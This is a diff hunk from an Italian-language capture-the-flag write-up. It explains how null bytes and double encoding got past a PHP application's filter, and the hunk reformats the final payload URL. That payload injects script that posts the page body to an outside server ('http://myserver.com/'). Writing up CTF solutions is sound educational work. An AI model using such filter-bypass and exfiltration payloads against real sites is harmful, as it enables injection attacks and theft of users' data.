@@ -92,7 +92,7 @@ Ora il grosso problema era il fatto che anche qualsiasi declinazione della parol
 Dopo diversi tentativi, supponendo che il filtro fosse realizzato applicativamente (e che quindi non ci fosse un WAF vero e proprio), ed essendo l'applicazione in PHP, iniziamo a provare inserendo null bytes %00 altri caratteri come %0a e %0d.
 Il null byte funziona ed il filtro smette di funzionare per qualsiasi carattere/strings dopo la presenza di %00. Continuando nei test noto pero' che anche Chrome ha qualche problema nel gestire la sintassi in caso di null bytes nel sorgente (al momento del writeup non riesco a riprodurre il problema..), provo quindi effettuando un double encoding, cioe' inserendo %2500 e noto che funziona lo stesso. Il payload finale quindi consiste in:
 
-```http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1```
+`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`
 
 Che risulta nel seguente codice:
 
